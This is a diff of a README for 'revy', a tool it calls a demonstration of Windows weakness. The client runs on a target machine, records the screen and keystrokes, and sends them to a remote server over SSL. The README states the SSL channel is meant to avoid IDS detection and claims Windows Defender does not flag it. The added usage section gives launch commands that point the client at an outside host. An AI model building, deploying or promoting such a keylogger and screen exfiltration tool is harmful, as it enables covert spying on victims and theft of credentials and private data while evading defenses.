@@ -4,25 +4,30 @@ This program is designed to be a demonstration of how vulnerable windows is to d
 It reads the target's screen, compresses the raw data 100:1 for data extraction, and simultaneously captures the key inputs during this time as well. These two things are sent to a remote server over SSL to prevent IDS detection. To my knowledge this __isn't detected__ by windows defender as malware, it __doesn't require__ admin escalation, and isn't susceptible to __PPI__ or other IDS exfil prevention techniques.
 
 ## TODO
-- At the moment this program works but development environments are difficult to set up with SSL.
-- Setup custom build files for better cross-platform support
-- Split server and client packages
+- Add web controller for the server component
+- Add server to client reconfigureability
 
 ## Installation
 
 __To compile for Windows__
 - Download OpenSSL
 - Set OPENSSL_DIR to the OpenSSL install location
-- Set the domain constants in client.rs (line 19)
-```
-cargo build
-```
+- Build via cargo
+
 __To compile for a remote server__
 - SSL guide coming soon
+- Build via cargo
 
 ## Usage
 Start the remote server and start the client process on the target machine.
-
+The target address (domain for SSL, IP for TCP) should be set in launch options
+Ex:
+```
+TCP
+./revy.exe 10.0.0.1 443
+SSL
+./revy.exe -s example.domain.xyz 443
+```
 ## Contributing
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
 
